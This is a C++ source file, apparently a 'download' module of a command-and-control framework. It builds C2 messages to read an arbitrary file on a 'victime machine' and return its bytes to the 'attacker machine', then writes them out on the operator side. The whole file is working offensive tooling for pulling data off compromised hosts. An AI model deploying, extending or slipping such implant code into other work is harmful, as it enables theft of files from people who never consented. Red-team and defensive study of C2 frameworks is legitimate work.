#include "Download.hpp"

#include <cstring>

#include "Common.hpp"


using namespace std;


constexpr std::string_view moduleName = "download";
constexpr unsigned long long moduleHash = djb2(moduleName);


#ifdef _WIN32

__declspec(dllexport) Download* DownloadConstructor() 
{
    return new Download();
}

#else

__attribute__((visibility("default"))) Download* DownloadConstructor() 
{
    return new Download();
}

#endif


Download::Download()
#ifdef BUILD_TEAMSERVER
	: ModuleCmd(std::string(moduleName), moduleHash)
#else
	: ModuleCmd("", moduleHash)
#endif
{
}

Download::~Download()
{
}

std::string Download::getInfo()
{
	std::string info;
#ifdef BUILD_TEAMSERVER
	info += "download:\n";
	info += "Download a file from victime machine to the attacker machine\n";
	info += "exemple:\n";
	info += "- download c:\\temp\\toto.exe c:\\temp\\toto.exe\n";
#endif
	return info;
}

int Download::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
	std::vector<std::string> quoteRegroupedCmd = regroupStrings(splitedCmd);

	if (quoteRegroupedCmd.size() == 3)
	{
		string inputFile = quoteRegroupedCmd[1];
		string outputFile = quoteRegroupedCmd[2];

		c2Message.set_instruction(quoteRegroupedCmd[0]);
		c2Message.set_inputfile(inputFile);
		c2Message.set_outputfile(outputFile);
	}
	else
	{
		c2Message.set_returnvalue(getInfo());
		return -1;
	}

	return 0;
}

#define ERROR_OPEN_FILE 1 

int Download::process(C2Message &c2Message, C2Message &c2RetMessage)
{
	c2RetMessage.set_instruction(c2RetMessage.instruction());
	c2RetMessage.set_cmd("");
	c2RetMessage.set_inputfile(c2Message.inputfile());
	c2RetMessage.set_outputfile(c2Message.outputfile());

	std::string inputFile = c2Message.inputfile();
	std::ifstream input(inputFile, std::ios::binary);
	if( input ) 
	{
		std::string buffer(std::istreambuf_iterator<char>(input), {});
		c2RetMessage.set_returnvalue("Success.");
		c2RetMessage.set_data(buffer.data(), buffer.size());
	}
	else
	{
		c2RetMessage.set_errorCode(ERROR_OPEN_FILE);
	}

	return 0;
}


int Download::followUp(const C2Message &c2RetMessage)
{
	// check if there is an error
	if(c2RetMessage.errorCode()==-1)
	{
		std::string outputFile = c2RetMessage.outputfile();
		std::ofstream output(outputFile, std::ios::binary);

		const std::string buffer = c2RetMessage.data();
		output << buffer;
		output.close();
	}

	return 0;
}


int Download::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
{
#ifdef BUILD_TEAMSERVER
	int errorCode = c2RetMessage.errorCode();
	if(errorCode>0)
	{
		if(errorCode==ERROR_OPEN_FILE)
			errorMsg = "Failed: Couldn't open file";
	}
#endif
	return 0;
}
